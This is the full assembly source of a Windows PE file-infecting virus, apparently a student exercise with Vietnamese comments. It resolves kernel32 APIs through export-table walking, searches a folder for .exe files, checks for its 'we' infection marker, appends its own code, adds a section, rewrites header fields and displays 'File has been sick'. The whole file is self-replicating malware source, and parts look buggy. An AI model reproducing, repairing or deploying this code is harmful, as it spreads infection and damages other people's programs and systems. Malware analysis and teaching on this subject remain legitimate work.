.386
.model flat, stdcall  ;32 bit memory model
.stack 100h
option casemap :none  ;case sensitive
include user32.inc
include kernel32.inc
include shell32.inc
include windows.inc
; Directives for the linker to link libraries
includelib c:\masm32\lib\user32.lib
includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\shell32.lib
.data
.code

start:
Start_virus:
	; Bat dau code tu day
	;--------------------------------------
	
	call Delta
	Delta:
	pop ebp
	sub ebp, offset Delta
	;-----------------------------------find kernel32
	mov esi, [esp]
	and esi, 0FFFF0000h
	call GetK32
		GetK32: 
		__1:	
					cmp 	word ptr [esi], "ZM"		
					jz 		CheckPE 
				 
		__2:		sub 	esi, 10000h 
					 
				 
		CheckPE:	mov 	edi, [esi + 3ch] 
					add 	edi, esi 
					cmp 	dword ptr [edi], "EP"		
					jz 		WeGotK32 
					jmp 	__2 
					 
		WeGotK32:	xchg 	eax, esi 
					mov addressK32, eax
    ;--------------------------------------ExportTable
    mov eax, addressK32
	add eax,3Ch
	mov ebx, addressK32
	add ebx, [eax]
	add ebx, 78h
	mov eax, addressK32
	add eax, [ebx+ebp]
	add eax, 1Ch
	mov eax,[eax]
	mov addressfuc, eax
	mov eax, addressK32
	add eax, [ebx+ebp]
	add eax, 1Ch
	add eax, 4
	mov eax,[eax]
	mov addressName, eax
	mov eax, addressK32
	add eax, [ebx+ebp]
	add eax, 1Ch
	add eax, 4
	add eax, 4
	mov eax,[eax]
	mov addressOr, eax

;-----------------------------Take Ordinal
xor eax,eax
	mov eax, addressK32
	add eax, ebp
	mov ebx, addressOr
	add eax, ebx
	mov ax ,word ptr [eax]
	mov of_nameOr, eax 
;-------------------------------Take GetProcAddress
xor eax,eax
_a:	
	mov ebx, addressName
	add ebx, [addressK32+ebp]
	mov ebx,[ebx]
	mov edx, addressK32
	add edx,ebx
_label1:
	cmp dword ptr[edx], "PteG"
	je _label2
	jne	_label
_label2:
	add edx, 04h
	cmp dword ptr[edx], "Acor"
	je _label3
	jne	_label
_label3:
	add edx,04h
	cmp dword ptr[edx], "erdd"
	je _label4
	jne	_label
_label4:
	add edx,04h
	cmp word ptr[edx], "ss"
	je founded
	
_label:
	mov edx, addressName
	add edx, 04h
	mov addressName, edx
	add count, 1
	jmp _a
;---------------------------------------------Take function
founded:
	sub edx, 0Ch
	mov GetP, edx 
	jmp _getf
_getf:
	mov eax, count
	mov ebx, 4
	mul ebx
	sub eax, 4
	mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	add ebx, 0Ch
	add ebx, eax
	mov ebx, [ebx]
	mov addressfuc, ebx
;-------------------------------------------------LoadLibraryA
	mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_LLA 
	push edx
	call ebx
	mov [ebp+ALoadLibraryA], eax 
;==================Find CreateFile Function=============================================
	mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_CreateFile 
	push edx
	call ebx
	mov [ebp+ACreateFileA], eax 
;==================Find FindFirstFile Function================================================
	
    mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_FFF 
	push edx
	call ebx
	mov [ebp+AFindFirstFileA], eax 

;==================Find FindNextFile Function================================================
		
    mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_FNF 
	push edx
	call ebx
	mov [ebp+AFindNextFileA], eax 
;==================Find FindClose Function================================================

     mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_FC 
	push edx
	call ebx
	mov [ebp+AFindCloseA], eax 
 
;==================Find WriteFile Function============================================
  mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_WriteFile
	push edx
	call ebx
	mov [ebp+AWriteFileA], eax 

;==================Find ReadFile Function============================================
  mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_ReadFile 
	push edx
	call ebx
	mov [ebp+AReadFileA], eax 

;==================Find CloseHandle Function============================================
  mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_CloseHandle
	push edx
	call ebx
	mov [ebp+ACloseHandleA], eax 

;==================Find SetFilePointer Function============================================
  	mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	mov edx , [addressK32+ebp]
	push offset api_SetFilePointer 
	push edx
	call ebx
	mov [ebp+ASetFilePointerA], eax 


;====================Find MessageBox Function=========================================
 	
	push offset szUser32
	call [ALoadLibraryA+ebp]
	push offset api_MessageBoxA 
	mov ebx, addressfuc
	add ebx, [addressK32+ebp]
	push eax
	call ebx
	mov [AMessageBoxAA], eax 
;===================Call FindFirstFile function========================================
    
    lea edx, [ebp+offset lpFFD]
    push edx
    lea eax, [ebp + offset Path]
    push eax
    call [ebp + AFindFirstFileA]
    mov [ebp + HFind], eax
;=================Call Create FIle=======================================================
	push 0
	push 20h
	push 3
	push 0
	push 1
	push 0C0000000h
	lea edx,  offset lpFFD.cFileName
	add edx, ebp
	push edx
	call [ACreateFileA+ebp]
	mov [ebp + HFile], eax
;===============================Check MZ============================
	push 0
	push offset random
	push 2
	push offset Buffer
	push [ebp + HFile]
	call [AReadFileA+ebp]
	mov eax, MZ
	mov ebx,dword ptr [Buffer]
	cmp eax, ebx
	jne breakall
;===============================Find E_flanew=====================
	push 0
	push 0
	push 3Ch
	push [ebp + HFile]
	call [ASetFilePointerA+ebp]
	
	push 0
	push offset random
	push 4
	push offset e_lfanew
	push [ebp + HFile] 
	call [AReadFileA+ebp]
;==============================Check PE=============================
	push 0
	push 0
	mov eax, [e_lfanew+ebp]
	push eax
	push [ebp + HFile] 
	call [ASetFilePointerA+ebp]
	
	push 0
	push offset random
	push 4
	push offset PE_Start
	push [ebp + HFile]
	call [AReadFileA+ebp]
	mov eax,dword ptr [PE_Start+ebp]
	cmp eax, "EP"
	jne breakall
;=============================Check mysignature=====================
	push 0
	push 0
	push 20h
	push [ebp + HFile] 
	call [ASetFilePointerA+ebp]
	
	push 0
	push offset random
	push 4
	push offset my_sign
	push [ebp + HFile]
	call [AReadFileA+ebp]
	mov ax, word ptr [my_sign+ebp]
	cmp eax, "ew"  
	je breakall
;==========================Virus code================================
	push 2
	push 0
	push 0
	push [ebp + HFile]
	call [ebp + ASetFilePointerA]
	
	mov eax, offset Start_virus
	add eax, ebp
	mov ebx, Start_virus
	mov ecx, End_virus
	sub ecx, ebx
	
	push 0
	lea edx ,[random+ebp] 
	push edx
	push ecx
	push eax
	push [ebp + HFile]
	call [AWriteFileA+ebp]
;===============================Section Aligment=================================
	push 0
	push 0
	mov eax,[e_lfanew+ebp]
	add eax, 38h
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [SectionAl+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset SectionAl
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
	mov eax, [SectionAl+ebp]
;============================File Aligment=======================================
	push 0
	push 0
	mov eax,[e_lfanew+ebp]
	add eax, 3Ch
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [FileAl+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset FileAl
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
	mov eax, [FileAl]
;==========================Number Section========================================
	push 0
	push 0
	mov eax,[e_lfanew+ebp]
	add eax, 6
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [Number_Of_Section+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset Number_Of_Section
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
	add [Number_Of_Section+ebp], 1
;=====================================Change numbersection========================
	push 0
	push 0
	mov eax,[e_lfanew+ebp]
	add eax, 6
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
	
	push 0
	push offset random
	push 2
	lea edx, [Number_Of_Section+ebp]
	push edx
	push [HFile+ebp]		
	call [AWriteFileA+ebp]
;==========================Size Of Image========================================
	push 0
	push 0
	mov eax,[e_lfanew+ebp]
	add eax, 50h
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [Size_Of_Image+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset Size_Of_Image
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
	mov eax, Size_Of_Image
	mov New_Size_Of_Image,eax
;=====================================Change Size Of Image========================
	push 0
	push 0
	mov eax,[e_lfanew+ebp]
	add eax, 50h
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
	
	push 0
	push offset random
	push 2
	lea edx, [New_Size_Of_Image+ebp]
	push edx
	push [HFile+ebp]		
	call [AWriteFileA+ebp]



;===================================Entry Point=================================
	push 0
	push 0
	mov eax,[e_lfanew+ebp]
	add eax, 28h
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [Address_Of_Entry_Point+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset Address_Of_Entry_Point
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
	mov eax, Address_Of_Entry_Point
	mov New_Address_Of_Entry_Point, eax
;=====================================Change EntryPoint========================
	push 0
	push 0
	mov eax,[e_lfanew+ebp]
	add eax, 28h
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
	
	push 0
	push offset random
	push 2
	lea edx, [New_Address_Of_Entry_Point+ebp]
	push edx
	push [HFile+ebp]		
	call [AWriteFileA+ebp]
;===================================Write My signature=================================
	push 0
	push 0
	push 20h	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
	
	push 0
	push offset random
	push 4
	lea edx, [mySignature+ebp]
	push edx
	push [HFile+ebp]		
	call [AWriteFileA+ebp]
;=================================FInd LastSection====================================
	mov ecx, [Number_Of_Section+ebp]
	mov eax, [e_lfanew+ebp]
	add eax, 0F8h 
	add eax, 8
_point1:
	add eax, 28h
	sub ecx, 1
	cmp cl, 1
	jne _point1
	mov LastSection, eax
;===============================Read Section========================================
	push 0
	push 0
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [Virtual_Size+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset Virtual_Size
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
;--------------------VituralAddress----------------------
	push 0
	push 0
	mov eax, [LastSection+ebp]
	add eax, 04h
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [Virtual_Address+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset Virtual_Address
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
;--------------------Last RawSize----------------------
	push 0
	push 0
	mov eax, [LastSection+ebp]
	add eax, 08h
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [Raw_Size+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset Raw_Size
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
;--------------------Last RawAddress----------------------
	push 0
	push 0
	mov eax, [LastSection+ebp]
	add eax, 0Ch
	push eax	
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]
															
	mov [Raw_Address+ebp], 0
	push 0							
	mov eax, offset random	
	add eax, ebp
	push eax 						
	push 4							
	mov eax, offset Raw_Address
	add eax, ebp
	push eax						
	push [HFile+ebp]		
	call [AReadFileA+ebp]
;============================Fix Section============================
			mov eax, [SectionAl	+ebp]
			mov  [Vitural_Size_Virus+ebp], eax
			
			mov eax, [Virtual_Size+ebp]
			mov ebx, [SectionAl+ebp]
			mov ecx, ebx
			lamtron:
			cmp ebx, eax
			jg gan
			add ebx, ecx
			jmp lamtron
			gan:
			mov eax, ebx
			mov ebx, [Virtual_Address+ebp]
			add eax, ebx
			mov [ebp+Vitural_Size_Virus], eax
			
			mov [Vitural_Size_Virus+ebp], eax
			mov eax, [Raw_Address+ebp]
			mov ebx, [Raw_Size+ebp]
			add eax, ebx
			mov [Raw_Address_Virus+ebp], eax
			
			
;============Virtualsize virus============================
			push 0
			push 0
			mov eax,[LastSection+ebp] 
			add eax, 40
			push eax
			push [ebp+HFile]
			call [ebp + ASetFilePointerA]				
			
			push 0
			lea edx, [ebp + random]
			push edx
			push 4
			lea edx, [ebp+Vitural_Size_Virus]
			push edx
			push [ebp + HFile]
			call [ebp + AWriteFileA]					
;==========VirtualAdd virus============================
			push 0
			push 0
			mov eax,[LastSection+ebp] 
			add eax, 40
			add eax, 04h
			push eax
			push [ebp+HFile]
			call [ebp + ASetFilePointerA]				
			
			push 0
			lea edx, [ebp + random]
			push edx
			push 4
			lea edx, [ebp+Vitural_Address_Virus]
			push edx
			push [ebp + HFile]
			call [ebp + AWriteFileA]	
;==========Rawsize virus============================
			push 0
			push 0
			mov eax,[LastSection+ebp] 
			add eax, 40
			add eax, 08h
			push eax
			push [ebp+HFile]
			call [ebp + ASetFilePointerA]				
			
			push 0
			lea edx, [ebp + random]
			push edx
			push 4
			lea edx, [ebp+Raw_Size_Virus]
			push edx
			push [ebp + HFile]
			call [ebp + AWriteFileA]
;==========RawAdd virus============================
			push 0
			push 0
			mov eax,[LastSection+ebp] 
			add eax, 40
			add eax, 0Ch
			push eax
			push [ebp+HFile]
			call [ebp + ASetFilePointerA]				
			
			push 0
			lea edx, [ebp + random]
			push edx
			push 4
			lea edx, [ebp+Raw_Address_Virus]
			push edx
			push [ebp + HFile]
			call [ebp + AWriteFileA]
;====================Character============================
	push 0
	push 0
	mov eax,[LastSection+ebp] 
	add eax, 40
	add eax, 28
	push eax
	push [ebp+HFile]
	call [ebp + ASetFilePointerA]				
			
	push 0
	lea edx, [ebp + random]
	push edx
	push 4
	lea edx, [ebp+Characteristics]
	push edx
	push [ebp + HFile]
	call [ebp + AWriteFileA]
;========================================massagebox============================
			push 0
			lea eax, offset szTitle
			add eax, ebp
			push eax
			lea eax,offset szMsg
			add eax, ebp
			push eax	
			push 0
			call [AMessageBoxAA+ebp]
			
;======================================Tra Entry============================
			push 0
			push 0
			mov eax,[e_lfanew+ebp]
			add eax, 28h
			push eax	
			push [ebp+HFile]
			call [ebp + ASetFilePointerA]
			
			push 0
			lea edx, [ebp + random]
			push edx
			push 4
			lea edx, [ebp+Address_Of_Entry_Point]
			push edx
			push [ebp + HFile]
			call [ebp + AWriteFileA]
			
			

	
;----------------------------------------------DataSegment
data_ segment
	addressK32 	dword 0
	addressfuc 	dword 0
	addressName dword 0
	GetP 		dword 0
	addressOr 	dword 0
	nameOr 		dword 0
	of_nameOr 	dword 0
	of_name 	dword 0
	count 		dword 0
	addressEx 	dword 0
	random 		dword 0
	my_sign 	dword 0
	SectionAl	dword 0
	FileAl		dword 0
	LastSection dword 0
;-------------------------------------
	api_LLA 				  	db 	"LoadLibraryA",0
	api_FFF					  	db	"FindFirstFileA", 0
	api_FNF					  	db	"FindNextFileA", 0
	api_FC					  	db	"FindClose", 0
	api_CreateFile			  	db	"CreateFileA", 0
	api_WriteFile			  	db	"WriteFile",0
	api_ReadFile			  	db	"ReadFile", 0
	api_OpenFile			  	db	"OpenFile", 0
	api_CloseHandle			  	db	"CloseHandle", 0
	api_SetFilePointer		  	db	"SetFilePointer", 0
	api_MessageBoxA           	db  "MessageBoxA",0
;-----------------------------------------
	szTitle 	              	db  "Virus",0
	szMsg    			      	db  "File has been sick",0
	szUser32				  	db  "User32.dll",0
	szKernel32				  	db	"Kernel32.dll",0
		
;-----------------------------------------	
	AGetProcAddressA          	dd  0
	ALoadLibraryA             	dd  0
	AFindFirstFileA			  	dd	0
	AFindNextFileA			  	dd	0	
	AFindCloseA				  	dd	0
	ACreateFileA			  	dd	0
	AWriteFileA				  	dd	0
	AReadFileA				  	dd	0
	AOpenFileA				  	dd	0
	ACloseHandleA			  	dd	0
	ASetFilePointerA		  	dd	0
	AMessageBoxAA   		  	dd	0
;-----------------------------------------------
	lpFFD					    WIN32_FIND_DATA <?>  
	Path					  	db	"E:\hoc hanh\Bkav\Tuan6\*.exe",0
	errcode					  	dd	?	
	
	HFind					  	dd	0
	HFile					  	dd	0
	Bread					  	dd	?
	Bytes_To_Read			  	dd	0
	Bytes_Read				  	dd	?
	Bytes_Written			  	dd	?
	Buffer					  	dw	MAX_PATH DUP (0)	
	
	e_lfanew				  	dd	?
	PE_Start				  	dd	?
	Number_Of_Section		  	dd	?
	Address_Of_Entry_Point	  	dd	?
	New_Address_Of_Entry_Point 	dd	?
	Size_Of_Image			 	dd	?
	New_Size_Of_Image		  	dd	?
	Virtual_Size			  	dd	?
	Virtual_Address			  	dd	?
	Raw_Size				  	dd	?
	Raw_Address				  	dd	?
	Raw_Address_Virus		  	dd	?
	Raw_Size_Virus			  	dd	0E00h
	Characteristics			  	dd	0E0000020h
	MZ						  	dd	5A4Dh
	mySignature					db "we",0
	Vitural_Size_Virus			dd	?
	Vitural_Address_Virus		dd	?
	
	Image_Base				  	dd	400000h
data_ ends
	breakall:
	push 0
	Call ExitProcess
End_virus:
end start 	